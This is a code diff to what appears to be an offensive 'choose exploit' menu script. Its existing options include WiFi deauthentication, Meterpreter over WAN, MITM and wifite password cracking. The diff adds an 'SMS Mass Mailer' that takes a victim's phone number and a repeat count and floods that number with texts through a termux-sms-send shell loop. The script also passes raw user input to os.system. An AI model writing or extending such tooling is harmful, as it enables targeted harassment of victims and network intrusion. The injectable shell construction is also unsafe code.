@@ -30,6 +30,7 @@ print('[3] Deauth WiFi network')                                             #Ex
 print('[4] Meterpreter Over Wan')
 print('[5] MITM Attack (Man in the middle Attack) (Using MITMf)')
 print('[6] Crack Wifi network password!')
+print('[7] SMS Mass Mailer')
 print('')
 query = input("[*] Choose exploit!:").lower()                                       
 if query.startswith('1'):
@@ -98,6 +99,15 @@ if query.startswith('6'):
 	dictionary = input('Enter name of dictionary file!:')
 	Cracking = ('wifite --dict ') + (dictionary)
 	os.system(Cracking)
+if query.startswith('7'):
+	print("Welcome to SMS Mailer!")
+	print("This working only on Termux, Nethunter, Andrax (Android Linux Terminal)")
+	number = input("Enter Victim Number:")
+	times = input("Write, how many times you want send SMS:")
+	text = input("Write message text:")
+	sms = ("for i in {1..") + (times) + ("}; do ") + ("termux-sms-send -n ") + (number) + (" ") + (text) + ("; done")
+	os.system(sms)
+	print("Messages Sended!")
 else:
 	print('')
 	print('[X] Sorry, You didnt choose options!')
